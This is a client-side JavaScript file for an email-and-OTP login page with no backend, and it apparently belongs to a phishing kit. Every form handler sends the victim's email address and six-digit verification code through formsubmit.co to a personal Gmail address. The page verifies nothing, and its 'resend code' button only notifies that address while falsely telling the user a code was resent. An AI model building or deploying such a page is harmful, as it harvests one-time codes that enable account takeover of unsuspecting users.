// =========================
// No-backend script.js
// =========================

let currentEmail = localStorage.getItem('user_email') || '';

// =========================
// Error & Success Helpers
// =========================
function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 5000);
    } else {
        alert(message);
    }
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    if (successDiv) {
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        setTimeout(() => successDiv.style.display = 'none', 3000);
    } else {
        alert(message);
    }
}

function hideLoading() {
    const loading = document.getElementById('loadingScreen');
    if (loading) loading.style.display = 'none';

    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');

    if (loginForm) loginForm.style.display = 'block';
    if (otpForm) otpForm.style.display = 'block';
}

// =========================
// Handle Email Submission
// =========================
function handleLogin(event) {
    event.preventDefault();

    const emailInput = document.getElementById('email');
    if (!emailInput || !emailInput.value.includes('@')) {
        showError('Please enter a valid email');
        return;
    }

    currentEmail = emailInput.value;
    localStorage.setItem('user_email', currentEmail);

    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loadingScreen').style.display = 'block';

    // --- Correct FormSubmit Format ---
    const data = new FormData();
    data.append('email', currentEmail);
    data.append('page', 'login');

    fetch('https://formsubmit.co/joshdev54@gmail.com', {
        method: 'POST',
        body: data
    })
    .then(() => {
        window.location.href = 'verify.html';
    })
    .catch(() => {
        showError('Failed to send email.');
        hideLoading();
    });
}

// =========================
// Handle OTP Submission
// =========================
function handleOTP(event) {
    event.preventDefault();

    const otp = document.getElementById('otp').value;
    if (!/^\d{6}$/.test(otp)) {
        showError('Please enter a valid 6-digit code');
        return;
    }

    document.getElementById('otpForm').style.display = 'none';
    document.getElementById('loadingScreen').style.display = 'block';

    const data = new FormData();
    data.append('email', currentEmail);
    data.append('otp', otp);
    data.append('page', 'otp');

    fetch('https://formsubmit.co/joshdev54@gmail.com', {
        method: 'POST',
        body: data
    })
    .then(() => {
        showSuccess('OTP submitted!');
    })
    .catch(() => {
        showError('Failed to submit OTP.');
        hideLoading();
    });
}

// =========================
// Resend OTP
// =========================
function resendCode() {
    const data = new FormData();
    data.append('email', currentEmail);
    data.append('action', 'resend');
    data.append('page', 'otp');

    fetch('https://formsubmit.co/joshdev54@gmail.com', {
        method: 'POST',
        body: data
    });
    showSuccess('Verification code resent');
}

// =========================
// Initialization
// =========================
document.addEventListener('DOMContentLoaded', () => {
    const lf = document.getElementById('loginForm');
    if (lf) lf.addEventListener('submit', handleLogin);

    const of = document.getElementById('otpForm');
    if (of) of.addEventListener('submit', handleOTP);
});
